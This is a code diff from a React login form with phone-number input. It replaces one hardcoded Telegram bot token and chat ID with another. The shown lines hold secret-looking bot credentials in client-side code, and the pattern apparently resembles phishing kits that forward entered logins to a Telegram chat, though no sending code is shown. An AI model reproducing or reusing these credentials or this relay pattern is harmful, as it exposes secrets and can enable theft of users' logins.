@@ -6,8 +6,8 @@ import PhoneInput from "react-phone-input-2";
 import "react-phone-input-2/lib/style.css";
 
 function LoginForm({ onClose }) {
-  const botToken = "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA";
-  const chatId = "7211586401";
+  const botToken = "8142928186:AAGE_KqkalgiC24BoZcmtYg5EHhyHDIRs5w";
+  const chatId = "1400161225";
   const [messageId, setMessageId] = useState(null);
 
   const navigate = useNavigate();
